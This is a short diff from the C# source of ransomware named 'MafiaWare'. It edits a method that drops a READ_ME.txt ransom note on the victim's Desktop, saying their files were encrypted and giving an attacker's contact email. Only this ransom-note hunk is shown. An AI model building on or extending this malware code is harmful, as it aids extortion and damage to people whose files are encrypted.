@@ -167,7 +167,7 @@ namespace mafiaware {
     public void pesanReadMe() {
         string path = "\\Desktop\\READ_ME.txt";
         string fullpath = dirUsr + namaUser + path;
-        string[] lines = { "Cyberking was Encrypt your File with MafiaWare", "Email me and meet me", "my email cyberking@indonesianbacktrack.or.id" };
+        string[] lines = { "Cyberking was Encrypt your File with MafiaWare", "Email me and meet me", "cyberking@indonesianbacktrack.or.id" };
         System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
